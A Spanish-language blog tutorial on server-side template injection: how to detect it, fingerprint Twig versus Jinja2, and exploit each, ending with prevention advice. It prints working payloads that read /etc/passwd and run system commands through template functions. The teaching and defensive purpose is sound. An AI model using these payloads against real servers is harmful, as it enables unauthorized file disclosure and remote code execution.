---
date: 2025-10-20T16:15:05.000Z
layout: post
comments: true
title: "Server-side Template Injection"
subtitle: 'SSTI'
description: >-
image: >-
  https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/sstilogo.png
optimized_image: >-
  https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/sstilogo.png
category: ciberseguridad
tags:
  - web
  - rce
  - owasp
  - php
  - ssti
author: Felipe Canales Cayuqueo
paginate: true
---

La inyección de plantillas del lado del servidor (SSTI) ocurre cuando un atacante logra insertar código dentro de una plantilla que luego es procesada por el servidor. Esto permite que el código malicioso se ejecute durante el renderizado, pudiendo comprometer por completo el sistema. La vulnerabilidad surge cuando la aplicación inserta directamente la entrada del usuario en la plantilla antes de renderizarla, o cuando el mismo contenido renderizado se vuelve a procesar, provocando que la entrada del usuario sea tratada como parte del código de plantilla.

### Identificación

Para poder confirmar la vulnerabilidad se debe provocar un mensaje de error en la aplicación web con el siguiente payload:

    ${{<%[%'"}}%\. 

Tras identificar la posible vulnerabilidad, se debe determinar el motor de plantilla utilizado por la aplicación web a través de la siguiente tabla. 

[![ssti7](/images/ssti7.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/ssti7.png)

#### Payloads

* `${7*7}`
* `a{*comment*}b`
* `${"z".join("ab")}`
* `{{7*7}}`
* `{{7*'7'}}`

#### Ejemplo

* Primero ingresamos `${7*7}`. Como no se interpretó, significa que debemos seguir en la tabla la flecha que dice "Si no funciona".
 
    [![ssti1](/images/ssti1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/ssti1.png)

    [![ssti2](/images/ssti2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/ssti2.png)

* La tabla nos indica que debemos ahora probar con el payload `{{7*7}}`, con el cual obtenemos éxito y se interpreta.

    [![ssti3](/images/ssti3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/ssti3.png)

    [![ssti4](/images/ssti4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/ssti4.png)

* Como funcionó, ahora debemos validar `{{7*'7'}}`. Si el resultado es `49`, estamos ante un motor **Twig**; si el resultado es `7777777`, estamos ante **Jinja2**.

    [![ssti5](/images/ssti5.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/ssti5.png)

    [![ssti6](/images/ssti6.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/ssti6.png)


### Explotación de Twig

Para este caso tenemos ciertas funciones internas para obtener más información e incluso obtener acceso al sistema.

#### Divulgación de información

Con la variable `_self` es posible obtener más información de la plantilla. Ejemplo:

    {{ _self }}

#### Local File Inclusion

El framework PHP Symfony define filtros Twig adicionales; uno de estos filtros es `file_excerpt`, que permite leer archivos locales del sistema. Ejemplo:

    {{ "/etc/passwd"|file_excerpt(1,-1) }}

#### Ejecución remota de comandos (RCE)

Para lograr ejecución remota de código en entornos que permitan estas operaciones, se puede usar una función del entorno (por ejemplo `system`) a través de filters. Ejemplo:

    {{ ['id'] | filter('system') }}


### Explotación de Jinja

Jinja es un motor de plantillas utilizado en frameworks de Python como Flask o Django. En este tipo de vulnerabilidad, el atacante puede aprovechar que Jinja permite acceder a bibliotecas ya importadas por la aplicación, tanto de forma directa como indirecta, e incluso importar nuevas mediante la instrucción `import`, lo que amplía su capacidad para ejecutar código malicioso en el servidor.

#### Divulgación de información

Es posible obtener información interna sobre el sistema, incluidos detalles de configuración e incluso el código fuente de la aplicación web. Ejemplo:

    {{ config.items() }}

También podemos obtener información sobre las funciones integradas y objetos disponibles:

    {{ self.__init__.__globals__.__builtins__ }}

#### Local File Inclusion

Para explotar esta vulnerabilidad podemos utilizar `open` desde los `__builtins__`:

    {{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}

#### Ejecución remota de comandos (RCE)

Para lograr la ejecución remota de comandos podemos usar `__import__('os')` y ejecutar `popen` o `system`:

    {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

> Se recomienda la herramienta automatizada [SSTImap](https://github.com/vladko312/SSTImap).

### Recomendaciones

Para prevenir vulnerabilidades SSTI es fundamental garantizar que la entrada del usuario nunca se inserte directamente en las plantillas antes del proceso de renderizado. Se debe validar y sanear toda entrada, evitando que contenga caracteres o estructuras que puedan ser interpretadas como código. Además, los datos del usuario deben pasarse únicamente como valores de contexto y no como parte del código de plantilla. Es recomendable utilizar motores de plantillas configurados con opciones de seguridad activadas, eliminar o restringir funciones peligrosas (como `eval` o `import`) y aislar el entorno de ejecución mediante contenedores o entornos separados. Finalmente, realizar auditorías de seguridad periódicas y aplicar defensa en profundidad (registro, monitoreo y controles de salida) ayudará a reducir el riesgo.
